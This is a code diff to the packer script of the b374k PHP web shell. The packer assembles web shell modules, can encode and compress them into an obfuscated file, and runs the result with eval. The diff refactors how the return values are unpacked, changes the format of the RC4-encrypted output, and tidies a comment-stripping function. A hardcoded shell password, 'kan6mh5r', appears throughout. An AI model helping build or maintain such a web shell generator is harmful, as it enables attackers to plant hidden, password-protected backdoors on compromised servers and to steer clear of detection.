@@ -89,7 +89,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
         $base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
         $phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-        list($err, $code, $content) = packer_b374k(null, $phpcode, $htmlcode, "no", "no", "no", -1, "b374k", "kan6mh5r");
+        list($err, $_, $content) = packer_b374k(null, $phpcode, $htmlcode, "no", "no", "no", -1, "b374k", "kan6mh5r");
         if ($content) {
             eval("?>" . $content);
         }
@@ -142,7 +142,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
 		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-		list($err, $code) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
+		list($err, $code, $_) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
         $GLOBALS['cipher_key'] = $debug_rc4_key;
 		packer_output($err . packer_html_safe(trim($code ? $code : "")));
 	}else{
@@ -417,7 +417,7 @@ $GLOBALS['cipher_key'] = $debug_rc4_key;
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
 		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-        list($err, $code) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, isset($opt['d']) ? 'kan6mh5r' : null);
+        list($err, $code, $_) = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, isset($opt['d']) ? 'kan6mh5r' : null);
         $res = $err . packer_html_safe(trim($code ? $code : ""));
 		$status = explode("{[|a374k|]}", $res);
 		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
@@ -531,7 +531,7 @@ function packer_output($str){
 	header("Content-Type: text/plain");
 	header("Cache-Control: no-cache");
 	header("Pragma: no-cache");
-    $str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.$str;
+    $str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|0|'.$str;
     echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 	die();
 }
@@ -556,10 +556,9 @@ function packer_strips($str){
 			if (in_array($token[0], $commentTokens)) continue;
 			$token = $token[1];
 		}
-	$newStr .= $token;
+	    $newStr .= $token;
 	}
-	$newStr = preg_replace("/(\s{2,})/", " ", $newStr);
-	return $newStr;
+	return preg_replace("/(\s{2,})/", " ", $newStr);
 }
 
 function packer_get_theme(){
